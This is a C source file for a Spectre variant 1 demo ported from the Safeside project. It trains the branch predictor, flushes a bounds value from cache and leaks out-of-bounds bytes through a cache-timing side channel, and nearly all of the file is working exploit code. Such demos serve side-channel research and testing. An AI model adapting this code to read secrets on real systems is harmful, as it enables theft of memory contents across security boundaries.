#include "trex.h"
#include "demo.h"
#include "utils.h"
#include "timing_array.h"

#include <string.h>
#include <stdio.h>

// TODO: this demo is a direct port from Safeside and its original comments
// are left in place.  We should fix that.

// Leaks the byte that is physically located at &text[0] + offset, without ever
// loading it. In the abstract machine, and in the code executed by the CPU,
// this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, bypassing the bounds check by training the branch predictor to
// think that the value will be in-range.
static char leak_byte(const char *data, size_t offset)
{
	struct timing_array *ta = ta_new();
	size_t *size_in_heap = malloc(sizeof(size_t));
	*size_in_heap = strlen(data);
	// The size needs to be unloaded from cache to force speculative execution
	// to guess the result of comparison.
	//
	// TODO(asteinha): since size_in_heap is no longer the only heap-allocated
	// value, it should be allocated into its own unique page

	for (int run = 0;; ++run) {
		ta_flush(ta);
		// We pick a different offset every time so that it's guaranteed that the
		// value of the in-bounds access is usually different from the secret value
		// we want to leak via out-of-bounds speculative access.
		int safe_offset = run % strlen(data);

		// Loop length must be high enough to beat branch predictors.
		// The current length 2048 was established empirically. With significantly
		// shorter loop lengths some branch predictors are able to observe the
		// pattern and avoid branch mispredictions.
		for (size_t i = 0; i < 2048; ++i) {
			// Remove from cache so that we block on loading it from memory,
			// triggering speculative execution.
			flush_cacheline(size_in_heap);

			// Train the branch predictor: perform in-bounds accesses 2047 times,
			// and then use the out-of-bounds offset we _actually_ care about on the
			// 2048th time.
			// The local_offset value computation is a branchless equivalent of:
			// size_t local_offset = ((i + 1) % 2048) ? safe_offset : offset;
			// We need to avoid branching even for unoptimized compilation (-O0).
			// Optimized compilations (-O1, concretely -fif-conversion) would remove
			// the branching automatically.
			size_t local_offset =
				offset + (safe_offset - offset) * (bool)((i + 1) % 2048);

			if (local_offset < *size_in_heap) {
				// This branch was trained to always be taken during speculative
				// execution, so it's taken even on the 2048th iteration, when the
				// condition is false!
				force_read(ta->entries[(size_t)data[local_offset]]);
			}
		}

		int result = ta_find_first_cached_index_after(ta, data[safe_offset]);

		if (result >= 0 && result != data[safe_offset]) {
			ta_free(ta);
			return (char)result;
		}

		if (run > 100000) {
			ta_free(ta);
			trex_demo_exit(TREX_COULDNT_LEAK);
		}
	}
}

int main(void)
{
	trex_demo_init(false, false);

	const size_t private_offset = private_data - public_data;
	for (size_t i = 0; i < SECRET_LEN; ++i) {
		// On at least some machines, this will print the i'th byte from
		// private_data, despite the only actually-executed memory accesses being
		// to valid bytes in public_data.
		print_leak(leak_byte(public_data, private_offset + i), i);
	}

	trex_demo_exit(TREX_SUCCESS);
}
